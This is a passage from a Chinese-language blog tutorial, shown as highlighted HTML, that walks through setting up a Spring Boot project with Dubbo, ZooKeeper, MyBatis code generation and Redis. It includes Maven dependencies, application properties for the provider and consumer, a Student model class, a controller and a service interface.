class="string">&quot;C:\Users\Administrator\Desktop\04-SpringBoot\code\IDEA-springboot-projectes\023-springboot-dubbo-ssm-interface\src\main\java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 生成 MyBatis 的 Mapper.xml 文件，targetPackage 指定 mapper.xml 文件的</span></span><br><span class="line"><span class="comment">        包名， targetProject 指定生成的 mapper.xml 放在 eclipse 的哪个工程下面 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.bjpowernode.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                         <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 生成 MyBatis 的 Mapper 接口类文件,targetPackage 指定 Mapper 接口类的包</span></span><br><span class="line"><span class="comment">        名， targetProject 指定生成的 Mapper 接口放在 eclipse 的哪个工程下面 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">&quot;XMLMAPPER&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetPackage</span>=<span class="string">&quot;com.bjpowernode.springboot.mapper&quot;</span> <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 数据库表名及对应的 Java 模型类名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;t_student&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Student&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableCountByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableUpdateByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableDeleteByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableSelectByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">selectByExampleQueryId</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意，这里要改成绝对路径！而且不能出现中文，否则构建项目会出现问题。</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!-- 生成 model 类，targetPackage 指定 model 类的包名， targetProject 指定</span></span><br><span class="line"><span class="comment">        生成的 model 放在 eclipse 的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.bjpowernode.springboot.model&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">targetProject</span>=<span class="string">&quot;C:\Users\Administrator\Desktop\04-SpringBoot\code\IDEA-springboot-projectes\023-springboot-dubbo-ssm-interface\src\main\java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在POM.xml中添加生成插件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--mybatis 代码自动生成插件--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--配置文件的位置--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>GeneratorMapper.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再添加Redis依赖，接口工程依赖，zookeeper注册中心依赖，Dubbo依赖，Mybatis依赖，Mysql驱动依赖到POM.xml中:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--Dubbo集成SpringBoot起步依赖--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--注册中心--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--MyBatis集成Springboot起步依赖--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--MySQL驱动--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--SpringBoot集成Redis起步依赖--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--接口工程--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.bjpowernode.springboot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>023-springboot-dubbo-ssm-interface<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置Provider项目中的核心配置文件:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置内嵌Tomcat端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="comment">#设置上下文根</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#设置连接数据库信息</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/springboot?useUnicode=true&amp;characterEncoding=UTF-8&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">username</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">password</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#设置dubbo配置</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">024-springboot-dubbo-ssm-provider</span></span><br><span class="line"><span class="comment">#声明当前工程为服务提供者</span></span><br><span class="line"><span class="attr">spring.dubbo.server</span>=<span class="string">true</span></span><br><span class="line"><span class="comment">#设置注册中心</span></span><br><span class="line"><span class="attr">spring.dubbo.registry</span>=<span class="string">zookeeper://localhost:2181</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#设置redis配置</span></span><br><span class="line"><span class="attr">spring.redis.host</span>=<span class="string">127.0.0.1</span></span><br><span class="line"><span class="attr">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="attr">spring.redis.password</span>=<span class="string"></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意：Mybatis生成的逆向文件Model中的java构造类一定要序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="comment">// implements Serializable序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em><strong>In the second place</strong></em>，在Consumer项目工程文件中添加POM.xml依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--Dubbo集成SpringBoot框架起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dubbo-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--zookeeper注册中心--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.101tec<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zkclient<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--接口工程--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.bjpowernode.springboot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>023-springboot-dubbo-ssm-interface<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--SpringBoot集成JSP,仅仅只是展示JSP页面需要添加解析jsp页面的依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>并且添加JSP文件到编译资源文件中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span>&gt;</span>*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置Consumer项目工程的核心配置文件：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置内嵌Tomcat端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#设置dubbo配置</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">025-springboot-dubbo-ssm-consumer</span></span><br><span class="line"><span class="attr">spring.dubbo.registry</span>=<span class="string">zookeeper://127.0.0.1:2181</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#配置视图解析器</span></span><br><span class="line"><span class="attr">spring.mvc.view.prefix</span>=<span class="string">/</span></span><br><span class="line"><span class="attr">spring.mvc.view.suffix</span>=<span class="string">.jsp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来在Application.java的同级目录或次级目录添加控制层包web，包内创建StudentController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.config.annotation.Reference;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.model.Student;</span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.service.StudentService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Reference(interfaceName = &quot;com.bjpowernode.springboot.service.StudentService&quot;, version = &quot;1.0.0&quot;, check = false)</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//RESTFul风格</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">studentDetail</span><span class="params">(Model model,</span></span><br><span class="line"><span class="params">                                <span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> studentService.queryStudentById(id);</span><br><span class="line"></span><br><span class="line">        model.addAttribute(<span class="string">&quot;student&quot;</span>, student);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;studentDetail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/student/all/count&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span></span><br><span class="line">    Object <span class="title function_">allStudentCount</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">allStudentCount</span> <span class="operator">=</span> studentService.queryAllStudentCount();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;学生总人数为:&quot;</span> + allStudentCount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了实现这一控制层，我们需要先在接口工程项目文件（Interface）中创建所需要的接口StudentService.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bjpowernode.springboot.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.bjpowernode.springboot.model.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据学生ID查询详情</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Student <span class="title function_">queryStudentById</span><span class="params">(Integer id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取学生总人数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Integer <span class="title function_">queryAllStudentCount</span><span class="params">()</span>;</span><br><span class="line"></span><br><span 